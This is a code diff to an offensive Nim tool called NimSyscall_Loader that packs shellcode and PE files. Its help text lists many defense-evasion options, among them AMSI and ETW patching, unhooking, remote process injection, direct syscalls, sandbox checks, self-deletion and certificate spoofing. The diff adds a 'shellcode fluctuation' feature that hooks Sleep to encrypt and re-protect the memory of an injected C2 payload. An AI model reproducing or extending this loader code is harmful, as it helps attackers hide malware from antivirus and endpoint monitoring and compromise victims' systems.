@@ -57,7 +57,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --noRES --dll --dllexportfunc=<exportfuncname> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --noRES --dll --dllexportfunc=<exportfuncname> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -106,6 +106,8 @@ Options:
       --signdomain www.example.com    The domain to use for the certificate (default is www.microsoft.com)
   --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
   --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
+  --fluctuate    Enable ShellcodeFluctuation for local shellcode injection and PE-Loading (Alpha) - no support for remote injection
+                 This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
 
 [Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]
 
@@ -192,6 +194,7 @@ var
     compileX86: bool = false
     noassembly: bool = false
     sleepycrypt: bool = false
+    fluctuate: bool = false
     noDInvoke: bool = false
     noRES: bool = false
 
@@ -304,6 +307,9 @@ if args["--llvm"]:
 
 if args["--sleepycrypt"]:
     sleepycrypt = true
+
+if args["--fluctuate"]:
+    fluctuate = true
 
 if args["--hide"]:
   hide = true
@@ -506,6 +512,22 @@ when defined(lib_only):
     # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
     AttachConsole(-1)
 
+when defined(Fluctuate):
+    g_fluctuationData.shellcodeAddr = dectext[0].addr
+    g_fluctuationData.shellcodeSize = SIZE_T(dectext.len)
+    # Will change the hardcoded key later on
+    when defined(amd64):
+        g_fluctuationData.encodeKey = 0x1337DE4D
+    when defined(i386):
+        g_fluctuationData.encodeKey = 0x1337
+    g_fluctuationData.currentlyEncrypted = false
+    g_fluctuationData.protect = PAGE_READWRITE
+    g_fluctuate = FluctuateToRW
+    if (hookSleep()):
+        echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+    else:
+        echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
+
 var cmd: seq[string]
 var i = 1
 while i <= paramCount():
@@ -568,6 +590,8 @@ import base64
 import strutils
 import ptr_math
 import strenc
+when defined(Fluctuate):
+    import Fluctuation
 
 when defined(DInvoke):
     import DInvoke
@@ -1228,6 +1252,9 @@ if (not noRES):
             basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\cmd.o ")
         else:
             basicCompileFlags.add(fmt"--passL:{packerPath}/resource/cmd.o ")
+
+if(fluctuate):
+    basicCompileFlags.add(fmt"-d:Fluctuate ")
 
 if (compileX86):
     basicCompileFlags.add("--cpu:i386 ")
